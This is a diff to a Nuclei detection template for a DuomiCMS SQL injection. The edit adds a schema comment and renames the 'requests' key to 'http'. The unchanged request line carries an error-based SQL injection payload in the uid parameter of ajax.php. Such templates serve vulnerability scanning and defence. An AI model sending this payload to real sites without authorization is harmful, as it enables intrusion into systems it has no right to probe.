@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: duomicms-sql-injection
 info:
   name: DuomiCMS SQL Injection
@@ -11,7 +12,7 @@ info:
   tags: duomicms,sqli
 variables:
   num: "999999999"
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5({{num}})))"
